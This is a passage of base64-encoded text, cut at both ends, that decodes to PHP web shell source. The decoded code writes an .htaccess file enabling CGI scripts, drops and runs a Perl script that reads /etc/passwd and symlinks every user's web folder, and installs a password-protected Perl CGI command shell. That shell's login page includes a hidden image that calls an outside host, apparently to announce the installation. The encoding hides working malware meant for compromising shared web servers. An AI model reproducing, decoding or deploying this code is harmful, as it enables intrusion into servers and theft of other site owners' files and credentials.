ZvbnQgY29sb3I9Z3JlZW4+WytdIC5odGFjY2VzcyBGaWxlIENyZWF0ZWQgLjwvZm9udD48QlI+JzsNCn0NCmVsc2Ugew0KZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBObyBQZXJtIFRvIENyZWF0ZSAuaHRhY2Nlc3MgRmlsZSAhPC9mb250PjxCUj4iOw0KfQ0KQGZjbG9zZSgkZnAzKTsNCiRmaWxlUyA9IGJhc2U2NF9kZWNvZGUoIkl5RXZkWE55TDJKcGJpOXdaWEpzQ205d1pXNGdTVTVRVlZRc0lDSThMMlYwWXk5d1lYTnpkMlFpT3dwM2FHbHNaU0FvSUR4SlRsQlYNClZENGdLUXA3Q2lSc2FXNWxQU1JmT3lCQWMzQnlkRDF6Y0d4cGRDZ3ZPaThzSkd4cGJtVXBPeUFrZFhObGNqMGtjM0J5ZEZzd1hUc0sNCmMzbHpkR1Z0S0Nkc2JpQXRjeUF2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3dnSnlBdUlDUjFjMlZ5S1RzS2ZRPT0NCiIpOw0KJGZwUyA9IEBmb3BlbigiUEwtU3ltbGluay5jaW4iLCd3Jyk7DQokZndTID0gQGZ3cml0ZSgkZnBTLCRmaWxlUyk7DQppZiAoJGZ3Uykgew0KJFRFU1Q9QGZpbGUoJy9ldGMvcGFzc3dkJyk7DQppZiAoISRURVNUKSB7DQplY2hvICI8Zm9udCBjb2xvcj1yZWQ+WytdIENhbid0IFJlYWQgL2V0Yy9wYXNzd2QgRmlsZSAuPC9mb250PjxCUj4iOw0KZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBDcmVhdGUgVXNlcnMgU2hvcnRjdXRzIC48L2ZvbnQ+PEJSPiI7DQplY2hvICc8Zm9udCBjb2xvcj1yZWQ+WytdIEZpbmlzaCAhPC9mb250PjxCUj4nOw0KfQ0KZWxzZSB7DQpjaG1vZCgiUEwtU3ltbGluay5jaW4iLDA3NTUpOw0KZWNobyBAc2hlbGxfZXhlYygicGVybCBQTC1TeW1saW5rLmNpbiIpOw0KZWNobyAnPGZvbnQgY29sb3I9Z3JlZW4+WytdIFVzZXJzIFNob3J0Y3V0IENyZWF0ZWQgLjwvZm9udD48QlI+JzsNCmVjaG8gJzxmb250IGNvbG9yPWdyZWVuPlsrXSBGaW5pc2ggITwvZm9udD48QlI+JzsNCn0NCkBmY2xvc2UoJGZwUyk7DQp9DQplbHNlIHsNCmVjaG8gIjxmb250IGNvbG9yPXJlZD5bK10gTm8gUGVybSBUbyBDcmVhdGUgUGVybCBGaWxlICE8L2ZvbnQ+IjsNCn0NCn0NCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDEzJ10pKQ0Kew0KQG1rZGlyKCJjZ2lzaGVsbCIpOw0KQGNoZGlyKCJjZ2lzaGVsbCIpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOw0KICAgICAgICAkbWV0aW4gPSAiT3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5jaW4NCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5jaW4NCkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuY2luIjsgICAgDQogICAgICAgIGZ3cml0ZSAoICRkb3N5YSAsICRtZXRpbiApIDsNCiAgICAgICAgZmNsb3NlICgkZG9zeWEpOw0KJGNnaXNoZWxsaXpvY2luID0gJ0l5RXZkWE55TDJKcGJpOXdaWEpzSUMxSkwzVnpjaTlzYjJOaGJDOWlZVzVrYldGcGJnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUE4WWlCemRIbHNaVDBpWTI5c2IzSTZZbXhoWTJzN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalptWm1aalkySWo1d2NtbDJPQ0JqWjJrZ2MyaGxiR3c4TDJJK0lDTWdjMlZ5ZG1WeURRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRb05DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5DaU1nUTI5dVptbG5kWEpoZEdsdmJqb2dXVzkxSUc1bFpXUWdkRzhnWTJoaGJtZGxJRzl1YkhrZ0pGQmhjM04zYjNKa0lHRnVaQ0FrVjJsdVRsUXVJRlJvWlNCdmRHaGxjZzBLSXlCMllXeDFaWE1nYzJodmRXeGtJSGR2Y21zZ1ptbHVaU0JtYjNJZ2JXOXpkQ0J6ZVhOMFpXMXpMZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSkZCaGMzTjNiM0prSUQwZ0luQnlhWFk0SWpzSkNTTWdRMmhoYm1kbElIUm9hWE11SUZsdmRTQjNhV3hzSUc1bFpXUWdkRzhnWlc1MFpYSWdkR2hwY3cwS0NRa0pDU01nZEc4Z2JHOW5hVzR1RFFvTkNpUlhhVzVPVkNBOUlEQTdDUWtKSXlCWmIzVWdibVZsWkNCMGJ5QmphR0Z1WjJVZ2RHaGxJSFpoYkhWbElHOW1JSFJvYVhNZ2RHOGdNU0JwWmcwS0NRa0pDU01nZVc5MUozSmxJSEoxYm01cGJtY2dkR2hwY3lCelkzSnBjSFFnYjI0Z1lTQlhhVzVrYjNkeklFNVVEUW9KQ1FrSkl5QnRZV05vYVc1bExpQkpaaUI1YjNVbmNtVWdjblZ1Ym1sdVp5QnBkQ0J2YmlCVmJtbDRMQ0I1YjNVTkNna0pDUWtqSUdOaGJpQnNaV0YyWlNCMGFHVWdkbUZzZFdVZ1lYTWdhWFFnYVhNdURRb05DaVJPVkVOdFpGTmxjQ0E5SUNJbUlqc0pDU01nVkdocGN5QmphR0Z5WVdOMFpYSWdhWE1nZFhObFpDQjBieUJ6WlhCbGNtRjBaU0F5SUdOdmJXMWhibVJ6RFFvSkNRa0pJeUJwYmlCaElHTnZiVzFoYm1RZ2JHbHVaU0J2YmlCWGFXNWtiM2R6SUU1VUxnMEtEUW9rVlc1cGVFTnRaRk5sY0NBOUlDSTdJanNKQ1NNZ1ZHaHBjeUJqYUdGeVlXTjBaWElnYVhNZ2RYTmxaQ0IwYnlCelpYQmxjbUYwWlNBeUlHTnZiVzFoYm1SekRRb0pDUWtKSXlCcGJpQmhJR052YlcxaGJtUWdiR2x1WlNCdmJpQlZibWw0TGcwS0RRb2tRMjl0YldGdVpGUnBiV1Z2ZFhSRWRYSmhkR2x2YmlBOUlERXdPd2tqSUZScGJXVWdhVzRnYzJWamIyNWtjeUJoWm5SbGNpQmpiMjF0WVc1a2N5QjNhV3hzSUdKbElHdHBiR3hsWkEwS0NRa0pDU01nUkc5dUozUWdjMlYwSUhSb2FYTWdkRzhnWVNCMlpYSjVJR3hoY21kbElIWmhiSFZsTGlCVWFHbHpJR2x6RFFvSkNRa0pJeUIxYzJWbWRXd2dabTl5SUdOdmJXMWhibVJ6SUhSb1lYUWdiV0Y1SUdoaGJtY2diM0lnZEdoaGRBMEtDUWtKQ1NNZ2RHRnJaU0IyWlhKNUlHeHZibWNnZEc4Z1pYaGxZM1YwWlN3Z2JHbHJaU0FpWm1sdVpDQXZJaTROQ2drSkNRa2pJRlJvYVhNZ2FYTWdkbUZzYVdRZ2IyNXNlU0J2YmlCVmJtbDRJSE5sY25abGNuTXVJRWwwSUdsekRRb0pDUWtKSXlCcFoyNXZjbVZrSUc5dUlFNVVJRk5sY25abGNuTXVEUW9OQ2lSVGFHOTNSSGx1WVcxcFkwOTFkSEIxZENBOUlERTdDUWtqSUVsbUlIUm9hWE1nYVhNZ01Td2dkR2hsYmlCa1lYUmhJR2x6SUhObGJuUWdkRzhnZEdobERRb0pDUWtKSXlCaWNtOTNjMlZ5SUdGeklITnZiMjRnWVhNZ2FYUWdhWE1nYjNWMGNIVjBMQ0J2ZEdobGNuZHBjMlVOQ2drSkNRa2pJR2wwSUdseklHSjFabVpsY21Wa0lHRnVaQ0J6Wlc1a0lIZG9aVzRnZEdobElHTnZiVzFoYm1RTkNna0pDUWtqSUdOdmJYQnNaWFJsY3k0Z1ZHaHBjeUJwY3lCMWMyVm1kV3dnWm05eUlHTnZiVzFoYm1SeklHeHBhMlVOQ2drSkNRa2pJSEJwYm1jc0lITnZJSFJvWVhRZ2VXOTFJR05oYmlCelpXVWdkR2hsSUc5MWRIQjFkQ0JoY3lCcGRBMEtDUWtKQ1NNZ2FYTWdZbVZwYm1jZ1oyVnVaWEpoZEdWa0xnMEtEUW9qSUVSUFRpZFVJRU5JUVU1SFJTQkJUbGxVU0VsT1J5QkNSVXhQVnlCVVNFbFRJRXhKVGtVZ1ZVNU1SVk5USUZsUFZTQkxUazlYSUZkSVFWUWdXVTlWSjFKRklFUlBTVTVISUNFaERRb05DaVJEYldSVFpYQWdQU0FvSkZkcGJrNVVJRDhnSkU1VVEyMWtVMlZ3SURvZ0pGVnVhWGhEYldSVFpYQXBPdzBLSkVOdFpGQjNaQ0E5SUNna1YybHVUbFFnUHlBaVkyUWlJRG9nSW5CM1pDSXBPdzBLSkZCaGRHaFRaWEFnUFNBb0pGZHBiazVVSUQ4Z0lseGNJaUE2SUNJdklpazdEUW9rVW1Wa2FYSmxZM1J2Y2lBOUlDZ2tWMmx1VGxRZ1B5QWlJREkrSmpFZ01UNG1NaUlnT2lBaUlERStKakVnTWo0bU1TSXBPdzBLRFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGSmxZV1J6SUhSb1pTQnBibkIxZENCelpXNTBJR0o1SUhSb1pTQmljbTkzYzJWeUlHRnVaQ0J3WVhKelpYTWdkR2hsSUdsdWNIVjBJSFpoY21saFlteGxjeTRnU1hRTkNpTWdjR0Z5YzJWeklFZEZWQ3dnVUU5VFZDQmhibVFnYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNCMGFHRjBJR2x6SUhWelpXUWdabTl5SUhWd2JHOWhaR2x1WnlCbWFXeGxjeTROQ2lNZ1ZHaGxJR1pwYkdWdVlXMWxJR2x6SUhOMGIzSmxaQ0JwYmlBa2FXNTdKMlluZlNCaGJtUWdkR2hsSUdSaGRHRWdhWE1nYzNSdmNtVmtJR2x1SUNScGJuc25abWxzWldSaGRHRW5mUzROQ2lNZ1QzUm9aWElnZG1GeWFXRmliR1Z6SUdOaGJpQmlaU0JoWTJObGMzTmxaQ0IxYzJsdVp5QWthVzU3SjNaaGNpZDlMQ0IzYUdWeVpTQjJZWElnYVhNZ2RHaGxJRzVoYldVZ2IyWU5DaU1nZEdobElIWmhjbWxoWW14bExpQk9iM1JsT2lCTmIzTjBJRzltSUhSb1pTQmpiMlJsSUdsdUlIUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ2RHRnJaVzRnWm5KdmJTQnZkR2hsY2lCRFIwa05DaU1nYzJOeWFYQjBjeTROQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBOQ25OMVlpQlNaV0ZrVUdGeWMyVWdEUXA3RFFvSmJHOWpZV3dnS0NwcGJpa2dQU0JBWHlCcFppQkFYenNOQ2dsc2IyTmhiQ0FvSkdrc0lDUnNiMk1zSUNSclpYa3NJQ1IyWVd3cE93MEtDUTBLQ1NSTmRXeDBhWEJoY25SR2IzSnRSR0YwWVNBOUlDUkZUbFo3SjBOUFRsUkZUbFJmVkZsUVJTZDlJRDErSUM5dGRXeDBhWEJoY25SY0wyWnZjbTB0WkdGMFlUc2dZbTkxYm1SaGNuazlLQzRyS1NRdk93MEtEUW9KYVdZb0pFVk9WbnNuVWtWUlZVVlRWRjlOUlZSSVQwUW5mU0JsY1NBaVIwVlVJaWtOQ2dsN0RRb0pDU1JwYmlBOUlDUkZUbFo3SjFGVlJWSlpYMU5VVWtsT1J5ZDlPdzBLQ1gwTkNnbGxiSE5wWmlna1JVNVdleWRTUlZGVlJWTlVYMDFGVkVoUFJDZDlJR1Z4SUNKUVQxTlVJaWtOQ2dsN0RRb0pDV0pwYm0xdlpHVW9VMVJFU1U0cElHbG1JQ1JOZFd4MGFYQmhjblJHYjNKdFJHRjBZU0FtSUNSWGFXNU9WRHNOQ2drSmNtVmhaQ2hUVkVSSlRpd2dKR2x1TENBa1JVNVdleWREVDA1VVJVNVVYMHhGVGtkVVNDZDlLVHNOQ2dsOURRb05DZ2tqSUdoaGJtUnNaU0JtYVd4bElIVndiRzloWkNCa1lYUmhEUW9KYVdZb0pFVk9WbnNuUTA5T1ZFVk9WRjlVV1ZCRkozMGdQWDRnTDIxMWJIUnBjR0Z5ZEZ3dlptOXliUzFrWVhSaE95QmliM1Z1WkdGeWVUMG9MaXNwSkM4cERRb0pldzBLQ1Fra1FtOTFibVJoY25rZ1BTQW5MUzBuTGlReE95QWpJSEJzWldGelpTQnlaV1psY2lCMGJ5QlNSa014T0RZM0lBMEtDUWxBYkdsemRDQTlJSE53YkdsMEtDOGtRbTkxYm1SaGNua3ZMQ0FrYVc0cE95QU5DZ2tKSkVobFlXUmxja0p2WkhrZ1BTQWtiR2x6ZEZzeFhUc05DZ2tKSkVobFlXUmxja0p2WkhrZ1BYNGdMMXh5WEc1Y2NseHVmRnh1WEc0dk93MEtDUWtrU0dWaFpHVnlJRDBnSkdBN0RRb0pDU1JDYjJSNUlEMGdKQ2M3RFFvZ0NRa2tRbTlrZVNBOWZpQnpMMXh5WEc0a0x5ODdJQ01nZEdobElHeGhjM1FnWEhKY2JpQjNZWE1nY0hWMElHbHVJR0o1SUU1bGRITmpZWEJsRFFvSkNTUnBibnNuWm1sc1pXUmhkR0VuZlNBOUlDUkNiMlI1T3cwS0NRa2tTR1ZoWkdWeUlEMStJQzltYVd4bGJtRnRaVDFjSWlndUt5bGNJaTg3SUEwS0NRa2thVzU3SjJZbmZTQTlJQ1F4T3lBTkNna0pKR2x1ZXlkbUozMGdQWDRnY3k5Y0lpOHZaenNOQ2drSkpHbHVleWRtSjMwZ1BYNGdjeTljY3k4dlp6c05DZzBLQ1FraklIQmhjbk5sSUhSeVlXbHNaWElOQ2drSlptOXlLQ1JwUFRJN0lDUnNhWE4wV3lScFhUc2dKR2tyS3lrTkNna0pleUFOQ2drSkNTUnNhWE4wV3lScFhTQTlmaUJ6TDE0dUsyNWhiV1U5SkM4dk93MEtDUWtKSkd4cGMzUmJKR2xkSUQxK0lDOWNJaWhjZHlzcFhDSXZPdzBLQ1FrSkpHdGxlU0E5SUNReE93MEtDUWtKSkhaaGJDQTlJQ1FuT3cwS0NRa0pKSFpoYkNBOWZpQnpMeWhlS0Z4eVhHNWNjbHh1ZkZ4dVhHNHBLWHdvWEhKY2JpUjhYRzRrS1M4dlp6c05DZ2tKQ1NSMllXd2dQWDRnY3k4bEtDNHVLUzl3WVdOcktDSmpJaXdnYUdWNEtDUXhLU2t2WjJVN0RRb0pDUWtrYVc1N0pHdGxlWDBnUFNBa2RtRnNPeUFOQ2drSmZRMEtDWDBOQ2dsbGJITmxJQ01nYzNSaGJtUmhjbVFnY0c5emRDQmtZWFJoSUNoMWNtd2daVzVqYjJSbFpDd2dibTkwSUcxMWJIUnBjR0Z5ZENrTkNnbDdEUW9KQ1VCcGJpQTlJSE53YkdsMEtDOG1MeXdnSkdsdUtUc05DZ2tKWm05eVpXRmphQ0FrYVNBb01DQXVMaUFrSTJsdUtRMEtDUWw3RFFvSkNRa2thVzViSkdsZElEMStJSE12WENzdklDOW5PdzBLQ1FrSktDUnJaWGtzSUNSMllXd3BJRDBnYzNCc2FYUW9MejB2TENBa2FXNWJKR2xkTENBeUtUc05DZ2tKQ1NSclpYa2dQWDRnY3k4bEtDNHVLUzl3WVdOcktDSmpJaXdnYUdWNEtDUXhLU2t2WjJVN0RRb0pDUWtrZG1Gc0lEMStJSE12SlNndUxpa3ZjR0ZqYXlnaVl5SXNJR2hsZUNna01Ta3BMMmRsT3cwS0NRa0pKR2x1ZXlSclpYbDlJQzQ5SUNKY01DSWdhV1lnS0dSbFptbHVaV1FvSkdsdWV5UnJaWGw5S1NrN0RRb0pDUWtrYVc1N0pHdGxlWDBnTGowZ0pIWmhiRHNOQ2drSmZRMEtDWDBOQ24wTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJRY21sdWRITWdkR2hsSUVoVVRVd2dVR0ZuWlNCSVpXRmtaWElOQ2lNZ1FYSm5kVzFsYm5RZ01Ub2dSbTl5YlNCcGRHVnRJRzVoYldVZ2RHOGdkMmhwWTJnZ1ptOWpkWE1nYzJodmRXeGtJR0psSUhObGRBMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtjM1ZpSUZCeWFXNTBVR0ZuWlVobFlXUmxjZzBLZXcwS0NTUkZibU52WkdWa1EzVnljbVZ1ZEVScGNpQTlJQ1JEZFhKeVpXNTBSR2x5T3cwS0NTUkZibU52WkdWa1EzVnljbVZ1ZEVScGNpQTlmaUJ6THloYlhtRXRla0V0V2pBdE9WMHBMeWNsSnk1MWJuQmhZMnNvSWtncUlpd2tNU2t2WldjN0RRb0pjSEpwYm5RZ0lrTnZiblJsYm5RdGRIbHdaVG9nZEdWNGRDOW9kRzFzWEc1Y2JpSTdEUW9KY0hKcGJuUWdQRHhGVGtRN0RRbzhhSFJ0YkQ0TkNqeG9aV0ZrUGcwS1BIUnBkR3hsUG5CeWFYWTRJR05uYVNCemFHVnNiRHd2ZEdsMGJHVStEUW9rU0hSdGJFMWxkR0ZJWldGa1pYSU5DZzBLRFFvOEwyaGxZV1ErRFFvOFltOWtlU0J2Ymt4dllXUTlJbVJ2WTNWdFpXNTBMbVl1UUY4dVptOWpkWE1vS1NJZ1ltZGpiMnh2Y2owaUkwWkdSa1pHUmlJZ2RHOXdiV0Z5WjJsdVBTSXdJaUJzWldaMGJXRnlaMmx1UFNJd0lpQnRZWEpuYVc1M2FXUjBhRDBpTUNJZ2JXRnlaMmx1YUdWcFoyaDBQU0l3SWlCMFpYaDBQU0lqUmtZd01EQXdJajROQ2p4MFlXSnNaU0JpYjNKa1pYSTlJakVpSUhkcFpIUm9QU0l4TURBbElpQmpaV3hzYzNCaFkybHVaejBpTUNJZ1kyVnNiSEJoWkdScGJtYzlJaklpUGcwS1BIUnlQZzBLUEhSa0lHSm5ZMjlzYjNJOUlpTkdSa1pHUmtZaUlHSnZjbVJsY21OdmJHOXlQU0lqUmtaR1JrWkdJaUJoYkdsbmJqMGlZMlZ1ZEdWeUlpQjNhV1IwYUQwaU1TVWlQZzBLUEdJK1BHWnZiblFnYzJsNlpUMGlNaUkrSXp3dlptOXVkRDQ4TDJJK1BDOTBaRDROQ2p4MFpDQmlaMk52Ykc5eVBTSWpSa1pHUmtaR0lpQjNhV1IwYUQwaU9UZ2xJajQ4Wm05dWRDQm1ZV05sUFNKV1pYSmtZVzVoSWlCemFYcGxQU0l5SWo0OFlqNGdEUW84WWlCemRIbHNaVDBpWTI5c2IzSTZZbXhoWTJzN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalptWm1aalkySWo1d2NtbDJPQ0JqWjJrZ2MyaGxiR3c4TDJJK0lFTnZibTVsWTNSbFpDQjBieUFrVTJWeWRtVnlUbUZ0WlR3dllqNDhMMlp2Ym5RK1BDOTBaRDROQ2p3dmRISStEUW84ZEhJK0RRbzhkR1FnWTI5c2MzQmhiajBpTWlJZ1ltZGpiMnh2Y2owaUkwWkdSa1pHUmlJK1BHWnZiblFnWm1GalpUMGlWbVZ5WkdGdVlTSWdjMmw2WlQwaU1pSStEUW9OQ2p4aElHaHlaV1k5SWlSVFkzSnBjSFJNYjJOaGRHbHZiajloUFhWd2JHOWhaQ1prUFNSRmJtTnZaR1ZrUTNWeWNtVnVkRVJwY2lJK1BHWnZiblFnWTI5c2IzSTlJaU5HUmpBd01EQWlQbFZ3Ykc5aFpDQkdhV3hsUEM5bWIyNTBQand2WVQ0Z2ZDQU5DanhoSUdoeVpXWTlJaVJUWTNKcGNIUk1iMk5oZEdsdmJqOWhQV1J2ZDI1c2IyRmtKbVE5SkVWdVkyOWtaV1JEZFhKeVpXNTBSR2x5SWo0OFptOXVkQ0JqYjJ4dmNqMGlJMFpHTURBd01DSStSRzkzYm14dllXUWdSbWxzWlR3dlptOXVkRDQ4TDJFK0lId05DanhoSUdoeVpXWTlJaVJUWTNKcGNIUk1iMk5oZEdsdmJqOWhQV3h2WjI5MWRDSStQR1p2Ym5RZ1kyOXNiM0k5SWlOR1JqQXdNREFpUGtScGMyTnZibTVsWTNROEwyWnZiblErUEM5aFBpQjhEUW84TDJadmJuUStQQzkwWkQ0TkNqd3ZkSEkrRFFvOEwzUmhZbXhsUGcwS1BHWnZiblFnYzJsNlpUMGlNeUkrRFFwRlRrUU5DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5QlFjbWx1ZEhNZ2RHaGxJRXh2WjJsdUlGTmpjbVZsYmcwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRkJ5YVc1MFRHOW5hVzVUWTNKbFpXNE5DbnNOQ2dra1RXVnpjMkZuWlNBOUlIRWtQQzltYjI1MFBqeG9NVDV3WVhOelBYQnlhWFk0UEM5b01UNDhabTl1ZENCamIyeHZjajBpSXpBd09Ua3dNQ0lnYzJsNlpUMGlNeUkrUEhCeVpUNDhhVzFuSUdKdmNtUmxjajBpTUNJZ2MzSmpQU0pvZEhSd09pOHZkM2QzTG5CeWFYWTRMbWxpYkc5bloyVnlMbTl5Wnk5ekxuQm9jRDhyWTJkcGRHVnNibVYwSUhOb1pXeHNJaUIzYVdSMGFEMGlNQ0lnYUdWcFoyaDBQU0l3SWo0OEwzQnlaVDROQ2lRN0RRb2pKdzBLQ1hCeWFXNTBJRHc4UlU1RU93MEtQR052WkdVK0RRb05DbFJ5ZVdsdVp5QWtVMlZ5ZG1WeVRtRnRaUzR1TGp4aWNqNE5Da052Ym01bFkzUmxaQ0IwYnlBa1UyVnlkbVZ5VG1GdFpUeGljajROQ2tWelkyRndaU0JqYUdGeVlXTjBaWElnYVhNZ1hsME5DanhqYjJSbFBpUk5aWE56WVdkbERRcEZUa1FOQ24wTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJRY21sdWRITWdkR2hsSUcxbGMzTmhaMlVnZEdoaGRDQnBibVp2Y20xeklIUm9aU0IxYzJWeUlHOW1JR0VnWm1GcGJHVmtJR3h2WjJsdURRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRcHpkV0lnVUhKcGJuUk1iMmRwYmtaaGFXeGxaRTFsYzNOaFoyVU5DbnNOQ2dsd2NtbHVkQ0E4UEVWT1JEc05DanhqYjJSbFBnMEtQR0p5UG14dloybHVPaUJoWkcxcGJqeGljajROQ25CaGMzTjNiM0prT2p4aWNqNE5Da3h2WjJsdUlHbHVZMjl5Y21WamREeGljajQ4WW5JK0RRbzhMMk52WkdVK0RRcEZUa1FOQ24wTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJRY21sdWRITWdkR2hsSUVoVVRVd2dabTl5YlNCbWIzSWdiRzluWjJsdVp5QnBiZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLYzNWaUlGQnlhVzUwVEc5bmFXNUdiM0p0RFFwN0RRb0pjSEpwYm5RZ1BEeEZUa1E3RFFvOFkyOWtaVDROQ2cwS1BHWnZjbTBnYm1GdFpUMGlaaUlnYldWMGFHOWtQU0pRVDFOVUlpQmhZM1JwYjI0OUlpUlRZM0pwY0hSTWIyTmhkR2x2YmlJK0RRbzhhVzV3ZFhRZ2RIbHdaVDBpYUdsa1pHVnVJaUJ1WVcxbFBTSmhJaUIyWVd4MVpUMGliRzluYVc0aVBnMEtQQzltYjI1MFBnMEtQR1p2Ym5RZ2MybDZaVDBpTXlJK0RRcHNiMmRwYmpvZ1BHSWdjM1I1YkdVOUltTnZiRzl5T21Kc1lXTnJPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJMlptWm1ZMk5pSStjSEpwZGpnZ1kyZHBJSE5vWld4c1BDOWlQanhpY2o0TkNuQmhjM04zYjNKa09qd3ZabTl1ZEQ0OFptOXVkQ0JqYjJ4dmNqMGlJekF3T1Rrd01DSWdjMmw2WlQwaU15SStQR2x1Y0hWMElIUjVjR1U5SW5CaGMzTjNiM0prSWlCdVlXMWxQU0p3SWo0TkNqeHBibkIxZENCMGVYQmxQU0p6ZFdKdGFYUWlJSFpoYkhWbFBTSkZiblJsY2lJK0RRbzhMMlp2Y20wK0RRbzhMMk52WkdVK0RRcEZUa1FOQ24wTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJRY21sdWRITWdkR2hsSUdadmIzUmxjaUJtYjNJZ2RHaGxJRWhVVFV3Z1VHRm5aUTBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLYzNWaUlGQnlhVzUwVUdGblpVWnZiM1JsY2cwS2V3MEtDWEJ5YVc1MElDSThMMlp2Ym5RK1BDOWliMlI1UGp3dmFIUnRiRDRpT3cwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9qSUZKbGRISmxhWFpsY3lCMGFHVWdkbUZzZFdWeklHOW1JR0ZzYkNCamIyOXJhV1Z6TGlCVWFHVWdZMjl2YTJsbGN5QmpZVzRnWW1VZ1lXTmpaWE56WlhNZ2RYTnBibWNnZEdobERRb2pJSFpoY21saFlteGxJQ1JEYjI5cmFXVnpleWNuZlEwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRWRsZEVOdmIydHBaWE1OQ25zTkNnbEFhSFIwY0dOdmIydHBaWE1nUFNCemNHeHBkQ2d2T3lBdkxDUkZUbFo3SjBoVVZGQmZRMDlQUzBsRkozMHBPdzBLQ1dadmNt